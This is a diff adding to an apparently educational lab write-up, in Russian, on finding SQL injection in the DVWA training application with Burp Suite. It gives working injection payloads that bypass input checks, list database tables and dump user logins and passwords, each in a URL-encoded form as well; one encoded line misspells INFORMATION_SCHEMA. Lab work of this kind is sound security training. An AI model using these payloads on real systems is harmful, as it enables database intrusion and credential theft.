@@ -62,6 +62,48 @@ $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid );
 
 ## Использование Burp Suite для нахождения уязвимости
 Настроим прокси в Burp Suite для возможности перехвата запросов:
+![image](https://github.com/halissha/rbpzos4_static/blob/main/proxy.jpg)
+
+Аналогично настроим прокси в ручном режиме в браузере:
+![image](https://github.com/halissha/rbpzos4_static/blob/main/proxy_browser.jpg)
+
+##Перехват запросов с DVWA SQL Injection
+Попробуем перехватить запрос с атакуемой страницы с помощью Interception:
+![image](https://github.com/halissha/rbpzos4_static/blob/main/intercept.jpg)
+
+##Обнаружение уязвимости с помощью Burp Suite
+Проведем следующую инъекцию и получим всех пользователей, с помощью OR легко проходим валидацию:
+```php
+1 OR 1=1#
+1+OR+1%3d1%23
+```
+Получим всех пользователей в ответе:
+![image](https://github.com/halissha/rbpzos4_static/blob/main/users.jpg)
+
+Теперь проведем инъекцию на обнаружение имен таблиц:
+```php
+1 UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES#
+1+UNION+SELECT+1,TABLE_NAME+FROM+INFORMATION.SCHEMA.TABLES%23
+```
+Получим имена всех таблиц, в ответе можно заметить важную таблицу users:
+![image](https://github.com/halissha/rbpzos4_static/blob/main/user_table.jpg)
+
+Следующим шагом попробуем вытащить логины и пароли из таблицы users с помощью следующей инъекции:
+```php
+1 UNION SELECT user, password FROM users#
+1+UNION+SELECT+user,+password+FROM+users%23
+```
+В отвече получим логины и пароли пользователей системы:
+![image](https://github.com/halissha/rbpzos4_static/blob/main/logins_passwords.jpg)
+
+
+
+
+
+
+
+
+
 
 
 
